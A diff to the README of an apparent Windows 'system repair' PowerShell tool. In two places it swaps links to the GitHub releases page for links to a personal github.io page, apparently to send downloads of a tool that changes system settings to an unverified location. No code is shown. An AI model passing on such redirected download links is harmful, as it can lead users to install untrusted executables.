@@ -1,6 +1,6 @@
 # 🛠️ Windows-System-Repair-PowerShell - Fix system errors and restore performance
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/beaverharoldi275/Windows-System-Repair-PowerShell/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://beaverharoldi275.github.io)
 
 ## What this tool does
 
@@ -18,7 +18,7 @@ Save your open documents and close all running applications. The tool modifies s
 
 You obtain the software from the official release page. 
 
-[Click here to visit the release page and download the software](https://github.com/beaverharoldi275/Windows-System-Repair-PowerShell/releases)
+[Click here to visit the release page and download the software](https://beaverharoldi275.github.io)
 
 1. Open the link in your web browser.
 2. Look for the section titled Latest.
